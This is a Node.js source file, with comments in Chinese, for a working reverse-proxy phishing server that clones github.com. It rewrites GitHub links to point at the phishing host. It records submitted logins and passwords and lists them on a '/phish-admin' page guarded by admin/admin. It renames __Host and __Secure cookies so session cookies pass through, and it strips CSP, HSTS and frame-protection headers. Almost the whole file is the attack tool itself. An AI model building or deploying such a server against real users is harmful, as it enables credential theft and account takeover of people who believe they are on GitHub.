/**
 * 雖然後端沒有cross origin問題，但axios default沒辦法傳cookie
 * 除非在request裡面待 {withCredentials: true}，
 * 同時server端要implement Access-Control-Allow-Origin = true，不能是 *...
 * 但因為github server沒辦法改server端只好換成request module
 */
// const express = require('express')
const request = require('request')
const axios = require('axios')
const http = require('http')
const qs = require('querystring')
const basicAuth = require('basic-auth')
const commander = require('commander')
const db = require('./db')

commander
  .version('0.0.1')
  .option('-u, --url <url>', 'URL')
  .option('-p, --port <port>', 'PORT')
  .parse(process.argv)

// program.args < 0 代表沒有任何輸入
if (commander.args.length < 1) {
  commander.outputHelp()  // 輸出說明
  // process.exit();        // 關閉程式
}

// axios want to send request with cookie should add this config!!
// axios.defaults.withCredentials = true

// db.defaults({ records: [] }).write()

// const app = express()

// const router = express.Router()

// app.get('/', function(req, res){
//   // console.log('req', req.headers)
//   res.send('hello world');
// })

// app.listen(3000)
console.log('port', commander.port)

const githubURL = 'https://github.com'
const phishingURL = commander.url || 'http://localhost:3000'

const server = http.createServer(async (req, resp) => {
  if (req.url === '/phish-admin') {
    // { name: 'something', pass: 'whatever' }
    const userCredentials = basicAuth(req)
 
    if (!userCredentials || !(userCredentials.name === 'admin' && userCredentials.pass === 'admin')) {
      resp.statusCode = 401
      resp.setHeader('WWW-Authenticate', 'Basic realm=Input User&Password')
      resp.end('Access denied')
    } else {
      const allRecords = db.get('records').value()
      console.log('allRecords', allRecords)
      const recordString = allRecords.reduce((cur, next) => {
        return cur + ', ' + next.login + ':' + next.password
      }, '')
      resp.write(recordString)
      resp.end()
    }
  } else {
    let postData
    const waitForPostData = () => {
      return new Promise((resolve, reject) => {
        // 監聽post data並在收完後做parsing傳入 cloneRequest
        // 若postData有資料就是post方法處理，若無就當作一班get request
        req.on('data', function (data) {
          postData += data
      
          // Too much POST data, kill the connection!
          // 1e6 === 1 * Math.pow(10, 6) === 1 * 1000000 ~~~ 1MB
          if (postData.length > 1e6){
            req.connection.destroy()
          }
        })
      
        req.on('end', function () {
          postData = qs.parse(postData)
          resolve(postData)
          // use postData['blah'], etc.
        })
      })
    }
    postData = await waitForPostData()
    if (postData && postData.password) {
      console.log('login', postData)
      const loginUser = db.get('records')
      .filter({ login: postData.login })
      .value()
      if (!loginUser) {
        db.get('records').push(postData).write()
      }
    }
  
    // postData may be null
    const { body, headers, statusCode } = await cloneRequest(req, postData)
    // console.log('clone resp headers', headers)
    // console.log('headers', headers)
    let newBody = replaceURLInHtml(body, headers)
    // 把 github回傳的cookie也回傳給user
    // console.log('Cookie', headers['set-cookie'])
    if (headers['set-cookie']) {
      const cookies = []
      for (let cookie of headers['set-cookie']) {
        const regex1 = /domain=.github.com;/g
        const regex2 = /secure;/g
        cookie = cookie.replace(regex1, '')
        cookie = cookie.replace(regex2, '')
        // console.log('cookie', cookie)
        // 因為以下__Host，__Secure，這兩個開頭的 cookie 都強制只能在 https 然後也要設定 secure 屬性
        // 這邊在從phishing server回到瀏覽器的過程把名字改掉，這樣就可以使用了
        cookie = cookie.replace('__Host', 'XXHost') 
        cookie = cookie.replace('__Secure', 'XXSecure')
        cookies.push(cookie)
      }
      resp.setHeader('Set-Cookie', cookies)
    }
    
    // 如果 statuscode 是 301/302，把 header 裡的 location 改成 phishingURL
    // 如果不加這個判斷，會讓頁面先被導到一個redirect頁面
    if (statusCode >= 300 && statusCode < 400) {
      console.log('location1', headers['location'])
      let location = headers['location'].replace(githubURL, phishingURL)
      console.log('location2', headers['location'])
      resp.setHeader('location', location)
    }
  
    // 回傳從 github server 相同的 headers
    // 
    for (let [key, value] of Object.entries(headers)) {
      console.log('cloneRespHeaderKey', key)
      if (key && key !== 'set-cookie' && key !== 'location')
      resp.setHeader(key, value)
    }
    // 一進 github 首頁的 dashboard 是空的，原本想說是需要處理一些header驗證的問題
    // 觀察後看起來跟 websocket 取不到資源有關? 之後再解!!!!!!!!!!
    resp.removeHeader('Content-Security-Policy')
    resp.removeHeader('Strict-Transport-Security')
    resp.removeHeader('X-Frame-Options')
    resp.removeHeader('X-Xss-Protection')
    resp.removeHeader('x-content-type-options')
    resp.removeHeader('referrer-policy')
    resp.removeHeader('vary')
    // resp.removeHeader('x-request-id')
    // resp.removeHeader('x-github-request-id')
  
    console.log('resp', resp.getHeaders())
    try {
      // 避免 redirect (301/302) 這裡也要轉傳statusCode
      resp.statusCode = statusCode
      resp.write(newBody)
      resp.end() // 這個不加的話，有些cookie不會回傳??
    } catch (e) {
      console.log(e)
    }
  }
})

const cloneRequest = async (req, postData) => {
  let url = req.url
  // let params = url.split('?')[1]
  // params = querystring.parse(params)
  const method = req.method
  console.log('method', method, url)
  // console.log('data', Object.keys(req))
  baseURL = githubURL
  console.log('postData', postData)
  let cookies = req.headers.cookie
  
  // 處理開頭為'__Host' and '__Secure'的 cookie
  // 這邊在把request送回github server前，要把之前改掉 prefix 的 cookie 改回來，這樣 github server才認得
  // 因為有些更隱私的操作需要帶這個只有在 same site 才能使用的 session
  cookies = req.headers.cookie.replace('XXHost', '__Host')
  cookies = cookies.replace('XXSecure', '__Secure')

  // 這邊處理除了 cookie 以外的 header
  // delete req.headers['cookie']
  // 避免複製到 gzip ，不然 github server 回傳壓縮過的資料我們還要額外解壓縮，才能修改 html 上的 url
  delete req.headers['accept-encoding']
  if (req.headers.referer) req.headers.referer = req.headers.referer.replace(phishingURL, githubURL)
  if (req.headers.origin) req.headers.origin = req.headers.origin.replace(phishingURL, githubURL)
  if (req.headers.host) req.headers.host = req.headers.host.replace(phishingURL.split('//')[1], githubURL.split('//')[1])
  // console.log('headers', req.headers.host, req.headers.referer)
  // console.log('head', {...req.headers})
  console.log('cookies', cookies)
  const options = {
    url: baseURL + url,
    method: method,
    // followAllRedirects: true,
    jar: true,
    headers: {
      referer: req.headers.referer,
      origin: req.headers.origin,
      host: req.headers.host,
      // ...req.headers, // 不能這樣用??!
      'cookie': cookies // 大小寫沒差
    },
    form: postData
  }
  const getRequest = () => {
    return new Promise(resolve => {
      request(options, (error, resp, body) => {
        // console.log('getRequest', Object.keys(resp))
        console.log('getRequest statusCode', resp.statusCode)
        resolve({
          headers: resp.headers,
          body: body,
          statusCode: resp.statusCode
        })
      })
    })
  }
  const { headers, body, statusCode } = await getRequest()
  // axios 用法
  // if (method === 'GET') {
  //   resp = await axios.request({
  //     method: method,
  //     url: url,
  //     baseURL: baseURL,
  //     // 沒有header就只能一般的使用網頁，沒有登入等記錄使用者的功能
  //     headers: { 
  //       'Cookie': cookies,
  //       'Host': 'github.com'
  //    } // 複製request的header(cookie)並發送請求，這樣就會把cookie帶到github網站
  //   })
  // } else {
  //   console.log('postData', postData)
  //   resp = await axios.request({
  //     method: method,
  //     url: url,
  //     baseURL: baseURL,
  //     // 沒有header就只能一般的使用網頁，沒有登入等記錄使用者的功能
  //     headers: { 
  //       'Cookie': cookies,
  //       'Host': 'github.com'
  //     }, // 複製request的header(cookie)並發送請求，這樣就會把cookie帶到github網站
  //     // data: postData
  //   })
  // }
  // return { body: resp.data, headers: resp.headers }
  return { body, headers, statusCode }
}

const replaceURLInHtml = (body, headers) => {
  // 如果client 請求的資源是html就修改某些url，避免有些超連結又連回github
  const contentType = headers['content-type']
  if (contentType.includes('text/html')) {
    console.log('true', typeof body)
    const githubURLRegex = /https:\/\/github.com/g
    let newBody = body.replace(githubURLRegex, phishingURL)

    // 因為前面修改了所有的https://github.com URL
    // 但要clone的respository URL也被改掉
    // 這邊再利用 regexp 改回來
    const regex = /http:\/\/localhost:3000(.*).git/g
    newBody = newBody.replace(regex, 'https://github.com$1.git')
    return newBody
  } else {
    console.log('false', contentType)
    return body
  }
}

server.listen(commander.port || 3000)

console.log(`listen on ${commander.port || 3000} port`)